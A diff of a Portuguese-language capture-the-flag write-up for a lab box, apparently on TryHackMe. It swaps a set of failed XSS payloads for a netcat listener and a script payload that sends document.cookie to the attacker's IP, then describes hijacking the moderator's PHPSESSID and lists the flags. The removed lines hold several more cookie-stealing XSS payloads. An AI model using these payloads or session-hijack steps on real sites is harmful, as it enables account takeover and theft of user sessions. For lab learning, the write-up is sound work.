@@ -57,7 +57,7 @@ username_input.send_keys("moderator")
 password_input.send_keys("Un6u3$$4Bl3!!")
 ```
 
-Tentando fazer login no domínio correto, primeiro usando **moderator**, recebemos erro. Porém, ao testar **admin** com a mesma senha, conseguimos acesso — e, com isso, a segunda flag:
+Tentando fazer login no domínio correto, primeiro usando **moderator**, recebemos erro. Porém, ao testar **admin** com a mesma senha, conseguimos acesso e, com isso, a segunda flag:
 
 <img width="1919" height="917" alt="image" src="https://github.com/user-attachments/assets/39a3dcea-6eae-44da-b6f6-3e7e9d1218ce" />
 
@@ -78,36 +78,29 @@ Ou seja, provavelmente precisamos manipular o fluxo do registro usando XSS ou mo
 
 ## Tentativa de exploração via XSS
 
-Como o registro envolve envio de dados ao cliente, testei injeções XSS para capturar cookies. Para isso, subi um servidor local:
-
+Configurei um servidor local utilizando o Netcat para escutar conexões na porta 2222:
 ```
-python -m http.server 1234
+nc -lvnp 2222
 ```
 
-O objetivo é fazer o navegador do sistema alvo requisitar meu servidor, enviando o cookie da vítima.
+O objetivo é fazer o navegador do sistema requisitar meu servidor, enviando o cookie da vítima.
 
-Testei algumas payloads comuns:
-
+Utilizei o seguinte payload em quase todos os campos do formulário de registro, exceto no campo "nome":
 ```
-<script>new Image().src='http://localhost:1234/?c='+document.cookie</script>
-<img src=x onerror="fetch('http://localhost:1234/?c='+document.cookie)">
-<img src=x onerror="new Image().src='http://localhost:1234/?c='+document.cookie">
-<img src=x onerror="var x=new XMLHttpRequest();x.open('GET','http://localhost:1234/?c='+document.cookie);x.send()">
-<img src=x onerror="navigator.sendBeacon('http://localhost:1234/', document.cookie)">
-<img src=x onerror="window.location='http://localhost:1234/?'+document.cookie;">
+<script>document.location=”http://192.168.129.186:2222/cookie?c=”+document.cookie</script>
 ```
-(Obs.: em localhost, deve-se passar o endereco do ip correto da maquina conectada.)
 
-Porém, nenhuma delas resultou em requisições ao meu servidor — indicando que o campo pode estar sanitizando entradas ou que o XSS ocorre em outro ponto do fluxo.
+Após alguns segundos, foi recebida a seguinte resposta no servidor, contendo o cookie da sessão:
+
+<img width="1183" height="236" alt="image" src="https://github.com/user-attachments/assets/e482152d-4271-4aeb-ad85-9c0765dfe046" />
+
+Com o cookie verdadeiro da conta de moderador em mãos, substituí o valor da sessão PHPSESSID no domínio login.worldwap.thm. Ao recarregar a página, foi possível acessar automaticamente a conta de moderador, resultando na flag que restava:
+
+<img width="1917" height="920" alt="image" src="https://github.com/user-attachments/assets/dbdbe657-0adc-46b7-895b-deccaaf2c0b7" />
 
 ---
 
-## Flag encontrada  
-**Flag:**  
+## Flags encontradas
+**Flag:**  `ModP@wnEd`
+
 **Flag:**  `AdM!nP@wnEd`
-
----
-
-## Possível desenvolvimento
-
-Se fosse possível capturar o cookie de sessão do perfil **moderador**, bastaria injetá-lo manualmente em **login.worldwap.thm** para assumir a sessão e revelar a flag. Assim como ocorreu com a conta de admin.
